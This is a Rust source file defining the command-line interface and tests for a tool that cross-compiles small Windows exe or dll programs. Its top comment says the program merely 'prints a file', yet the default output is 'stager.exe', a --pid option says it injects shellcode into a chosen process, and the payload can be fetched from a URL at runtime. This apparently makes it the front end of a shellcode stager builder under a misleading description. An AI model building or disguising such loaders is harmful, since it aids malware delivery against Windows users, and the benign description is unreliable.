use std::path::PathBuf;

use clap::{Args, Parser, ValueEnum};

/// Generates a tiny Windows program (exe or dll) that prints a file, and cross-compiles it.
///
/// Works on Windows and Linux. Needs only rustup/cargo: linking uses the rust-lld shipped
/// with every Rust toolchain, so no MSVC, mingw or Windows SDK is required.
#[derive(Debug, Parser)]
#[command(name = env!("CARGO_PKG_NAME"), version, about, long_about)]
pub struct Cli {
    #[command(flatten)]
    pub source: Source,

    /// Output format.
    #[arg(short, long, value_enum, default_value_t = Format::Exe)]
    pub format: Format,

    /// Windows architecture to build for.
    #[arg(short, long, value_enum, default_value_t = Arch::X86_64)]
    pub arch: Arch,

    /// Output file [default: stager.exe or stager.dll in the current directory].
    #[arg(short, long, value_name = "FILE")]
    pub output: Option<PathBuf>,

    /// Write the generated cargo project to DIR and keep it (rebuild it with `cargo build --release`).
    #[arg(long, value_name = "DIR")]
    pub keep: Option<PathBuf>,

    /// Use the template project in DIR instead of the built-in one (see --export-template).
    #[arg(long, value_name = "DIR")]
    pub template: Option<PathBuf>,

    /// Extra dependency line for the generated Cargo.toml, e.g. 'heapless = "0.8"'. Repeatable.
    /// Crates must be `no_std` compatible.
    #[arg(long = "dep", value_name = "SPEC")]
    pub deps: Vec<String>,

    /// Inject shellcode into this process instead of the default fallback chain.
    #[arg(long, value_name = "PROCESS")]
    pub pid: Option<String>,

    /// Fail instead of running `rustup target add` when the Windows target is missing.
    #[arg(long)]
    pub no_install: bool,

    /// Show cargo's output.
    #[arg(short, long)]
    pub verbose: bool,

    /// Write the built-in template project to DIR, for editing, and exit.
    #[arg(long, value_name = "DIR", exclusive = true)]
    pub export_template: Option<PathBuf>,
}

impl Cli {
    /// Parses the arguments. One source is required unless `--export-template` is used,
    /// which clap groups can't express, so it is checked here.
    pub fn try_parse_args<I, T>(args: I) -> Result<Self, clap::Error>
    where
        I: IntoIterator<Item = T>,
        T: Into<std::ffi::OsString> + Clone,
    {
        use clap::CommandFactory;
        let cli = Self::try_parse_from(args)?;
        let s = &cli.source;
        if cli.export_template.is_none() && s.local.is_none() && s.url.is_none() && s.embed.is_none() {
            return Err(Self::command().error(
                clap::error::ErrorKind::MissingRequiredArgument,
                "one of --local <PATH>, --url <URL> or --embed <FILE> is required",
            ));
        }
        Ok(cli)
    }
}

/// Where the generated program gets the file it prints. Exactly one is required.
#[derive(Debug, Args)]
#[group(multiple = false)]
pub struct Source {
    /// Read this path at runtime, on the Windows machine (relative to its working directory).
    #[arg(long, value_name = "PATH")]
    pub local: Option<String>,

    /// Download this URL at runtime (http or https).
    #[arg(long, value_name = "URL")]
    pub url: Option<String>,

    /// Bake this local file into the program at generation time.
    #[arg(long, value_name = "FILE")]
    pub embed: Option<PathBuf>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
pub enum Format {
    Exe,
    Dll,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
pub enum Arch {
    /// 64-bit x86 (aliases: x64, amd64)
    #[value(name = "x86_64", alias = "x64", alias = "amd64")]
    X86_64,
    /// 32-bit x86 (aliases: i686, x32)
    #[value(name = "x86", alias = "i686", alias = "x32")]
    X86,
    /// 64-bit ARM (alias: arm64)
    #[value(name = "aarch64", alias = "arm64")]
    Aarch64,
}

impl Arch {
    pub fn triple(self) -> &'static str {
        match self {
            Arch::X86_64 => "x86_64-pc-windows-msvc",
            Arch::X86 => "i686-pc-windows-msvc",
            Arch::Aarch64 => "aarch64-pc-windows-msvc",
        }
    }
}

impl Format {
    pub fn extension(self) -> &'static str {
        match self {
            Format::Exe => "exe",
            Format::Dll => "dll",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(args: &[&str]) -> Result<Cli, clap::Error> {
        Cli::try_parse_args(std::iter::once("gen").chain(args.iter().copied()))
    }

    #[test]
    fn source_is_required_and_exclusive() {
        assert!(parse(&[]).is_err());
        assert!(parse(&["--local", "a", "--url", "http://x"]).is_err());
        let cli = parse(&["--url", "http://x", "-a", "arm64", "-f", "dll"]).unwrap();
        assert_eq!(cli.arch, Arch::Aarch64);
        assert_eq!(cli.format, Format::Dll);
    }

    #[test]
    fn export_template_needs_no_source() {
        assert!(parse(&["--export-template", "dir"]).is_ok());
        assert!(parse(&["--export-template", "dir", "--local", "a"]).is_err());
    }

    #[test]
    fn verify_cli() {
        use clap::CommandFactory;
        Cli::command().debug_assert();
    }
}
